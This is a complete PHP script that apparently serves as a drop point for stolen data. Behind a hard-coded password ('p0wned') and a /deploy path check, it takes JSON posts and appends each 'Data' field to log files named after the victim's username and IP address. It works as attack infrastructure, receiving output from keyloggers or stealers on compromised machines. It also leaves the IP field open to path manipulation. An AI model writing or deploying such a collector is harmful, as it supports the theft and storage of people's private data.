<?php
$AUTH_PASS = 'p0wned';
$PAYLOAD_DIR = __DIR__ . '/payloads';

header('Content-Type: application/json');

// Verifica se está no diretório /deploy
$script_path = $_SERVER['SCRIPT_NAME'];
if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !== 0) {
    http_response_code(403);
    echo json_encode(['error' => 'Access denied. This script must be accessed via /deploy directory']);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

$rawData = file_get_contents('php://input');
$payload = json_decode($rawData, true);

if (!$payload || $payload['passwd'] !== $AUTH_PASS || empty($payload['Data'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request']);
    exit();
}

if (!is_dir($PAYLOAD_DIR)) {
    mkdir($PAYLOAD_DIR, 0755, true);
}

$username = preg_replace('/[^a-zA-Z0-9_-]/', '_', $payload['username'] ?? 'unknown');
$ip = str_replace('.', '_', $payload['ip'] ?? 'unknown');
$filename = "{$username}_{$ip}.log";

$timestamp = date('[d/m/Y] - H:i:s > ');
$content = "---==\n" . $timestamp . $payload['Data'] . "\n";

file_put_contents(
    $PAYLOAD_DIR . '/' . $filename,
    $content,
    FILE_APPEND | LOCK_EX
);

// Responde OK
echo json_encode(['status' => 'ok']);
?>
